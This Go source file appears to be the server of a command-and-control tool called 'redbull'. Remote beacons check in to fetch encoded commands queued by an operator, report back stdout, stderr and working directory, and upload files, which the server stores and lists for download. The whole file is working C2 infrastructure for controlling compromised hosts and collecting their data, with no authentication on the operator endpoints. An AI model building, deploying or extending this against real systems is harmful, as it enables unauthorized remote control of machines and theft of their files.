package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	config "redbull"
	"redbull/internal/rbhttp"
	"redbull/internal/rbqueue"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/chi/v5/middleware"
	"github.com/go-chi/cors"
	"github.com/go-chi/render"
	"github.com/google/uuid"
	"go.uber.org/zap"
)

var cmdQueue = rbqueue.NewQueue[string]()
var responses = rbhttp.NewBeaconResponses()
var lastCheckIn time.Time
var fileStoragePath string

func init() {
	logger := zap.Must(zap.NewDevelopment())
	zap.ReplaceGlobals(logger)

	// Set up file storage path in $HOME/.redbull/files
	homeDir, err := os.UserHomeDir()
	if err != nil {
		zap.L().Fatal("Failed to get home directory", zap.Error(err))
	}
	fileStoragePath = filepath.Join(homeDir, ".redbull", "files")

	// Create the directory if it doesn't exist
	if err := os.MkdirAll(fileStoragePath, 0755); err != nil {
		zap.L().Fatal("Failed to create file storage directory", zap.Error(err), zap.String("path", fileStoragePath))
	}
	zap.L().Info("File storage initialized", zap.String("path", fileStoragePath))
}

func errorResponse(w http.ResponseWriter, r *http.Request, status int, msg string) {
	render.Status(r, status)
	render.JSON(w, r, rbhttp.ErrorResponse{Error: msg})
}

func getLastCheckin(w http.ResponseWriter, r *http.Request) {
	duration := time.Since(lastCheckIn)
	ms := duration.Milliseconds()
	render.JSON(w, r, rbhttp.CheckInTimeResponse{CheckInTime: fmt.Sprintf("%d", ms)})
}

func checkIn(w http.ResponseWriter, r *http.Request) {
	cmdQueue.Lock()
	defer cmdQueue.Unlock()

	zap.L().Debug("queue", zap.Int("queue", cmdQueue.Len()), zap.Bool("empty", cmdQueue.IsEmpty()))
	lastCheckIn = time.Now()
	if cmdQueue.IsEmpty() {
		render.Status(r, 204)
		render.NoContent(w, r)
		return
	}

	command, _ := cmdQueue.Pop()
	encodedCmd := rbhttp.EncodeCommand(command)
	render.JSON(w, r, rbhttp.CheckInResponse{Command: encodedCmd})
}

func downloadFile(w http.ResponseWriter, r *http.Request) {
	// Create destination file
	filePath := filepath.Join(fileStoragePath, uuid.New().String())
	destFile, err := os.Create(filePath)
	if err != nil {
		zap.L().Error("downloadFile - create file", zap.Error(err))
		errorResponse(w, r, 500, fmt.Sprintf("failed to create file: %v", err))
		return
	}
	defer destFile.Close()

	// Stream directly from request body to disk
	_, err = io.Copy(destFile, r.Body)
	if err != nil {
		zap.L().Error("downloadFile - copy file", zap.Error(err))
		// Clean up partial file on error
		os.Remove(filePath)
		errorResponse(w, r, 400, fmt.Sprintf("failed to write file: %v", err))
		return
	}

	render.Status(r, 200)
	render.JSON(w, r, rbhttp.NewCommandResponse{Success: true})
}

func response(w http.ResponseWriter, r *http.Request) {
	httpBody, err := rbhttp.ReadJsonBody(r)
	if err != nil {
		zap.L().Error("response - read body", zap.Error(err))
		errorResponse(w, r, 400, err.Error())
		return
	}

	responses.Append(*rbhttp.NewBeaconResponse(httpBody.Command, httpBody.Stdout, httpBody.Stderr, httpBody.CurrentDirectory))
	render.Status(r, 204)
	render.NoContent(w, r)
}

func newCommand(w http.ResponseWriter, r *http.Request) {
	var newCommandRequest rbhttp.NewCommandRequest
	if err := render.Bind(r, &newCommandRequest); err != nil {
		zap.L().Error("newCommand - bind", zap.Error(err))
		errorResponse(w, r, 400, "invalid command")
		return
	}

	cmdQueue.Lock()
	defer cmdQueue.Unlock()
	cmdQueue.Append(newCommandRequest.Command)
	render.Status(r, 200)
	render.JSON(w, r, rbhttp.NewCommandResponse{Success: true})
}

func fetchResponses(w http.ResponseWriter, r *http.Request) {
	render.JSON(w, r, responses.Responses)
}

type FileInfo struct {
	Name    string    `json:"name"`
	Size    int64     `json:"size"`
	ModTime time.Time `json:"modTime"`
}

func fetchFiles(w http.ResponseWriter, r *http.Request) {
	files, err := os.ReadDir(fileStoragePath)
	if err != nil {
		zap.L().Error("fetchFiles - read directory", zap.Error(err))
		errorResponse(w, r, 500, fmt.Sprintf("failed to read directory: %v", err))
		return
	}
	fileInfos := make([]FileInfo, 0)
	for _, f := range files {
		info, err := f.Info()
		if err != nil {
			zap.L().Error("fetchFiles - get info", zap.Error(err))
			continue
		}
		fileInfos = append(fileInfos, FileInfo{
			Name:    f.Name(),
			Size:    info.Size(),
			ModTime: info.ModTime(),
		})
	}
	render.JSON(w, r, fileInfos)
}

func downloadFileFromServer(w http.ResponseWriter, r *http.Request) {
	filename := chi.URLParam(r, "filename")
	if filename == "" {
		errorResponse(w, r, 400, "filename is required")
		return
	}

	// Prevent directory traversal attacks
	if filepath.Base(filename) != filename {
		errorResponse(w, r, 400, "invalid filename")
		return
	}

	filePath := filepath.Join(fileStoragePath, filename)

	// Check if file exists
	fileInfo, err := os.Stat(filePath)
	if err != nil {
		if os.IsNotExist(err) {
			errorResponse(w, r, 404, "file not found")
			return
		}
		zap.L().Error("downloadFileFromServer - stat file", zap.Error(err))
		errorResponse(w, r, 500, fmt.Sprintf("failed to access file: %v", err))
		return
	}

	// Open the file
	file, err := os.Open(filePath)
	if err != nil {
		zap.L().Error("downloadFileFromServer - open file", zap.Error(err))
		errorResponse(w, r, 500, fmt.Sprintf("failed to open file: %v", err))
		return
	}
	defer file.Close()

	// Set headers for file download
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", filename))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", fileInfo.Size()))

	// Stream the file to the response
	_, err = io.Copy(w, file)
	if err != nil {
		zap.L().Error("downloadFileFromServer - copy file", zap.Error(err))
		return
	}
}

func main() {
	r := chi.NewRouter()
	r.Use(middleware.Logger)
	r.Use(middleware.RequestID)
	r.Use(middleware.RealIP)
	r.Use(middleware.Recoverer)
	r.Use(middleware.URLFormat)
	r.Use(render.SetContentType(render.ContentTypeJSON))
	r.Use(cors.Handler(cors.Options{
		// AllowedOrigins:   []string{"https://foo.com"}, // Use this to allow specific origin hosts
		AllowedOrigins: []string{"https://*", "http://*"},
		// AllowOriginFunc:  func(r *http.Request, origin string) bool { return true },
		AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
		AllowedHeaders:   []string{"Accept", "Authorization", "Content-Type", "X-CSRF-Token", "x-auth-token"},
		ExposedHeaders:   []string{"Link"},
		AllowCredentials: false,
		MaxAge:           300, // Maximum value not ignored by any of major browsers
	}))

	r.Get("/", checkIn)
	r.Post("/", response)
	r.Post("/command", newCommand)
	r.Get("/responses", fetchResponses)
	r.Get("/last_checkin", getLastCheckin)
	r.Post("/download", downloadFile)
	r.Get("/files", fetchFiles)
	r.Get("/files/{filename}", downloadFileFromServer)

	zap.L().Info("Server running", zap.Int("port", config.PORT_NUMBER))
	http.ListenAndServe(fmt.Sprintf("0.0.0.0:%d", config.PORT_NUMBER), r)
}
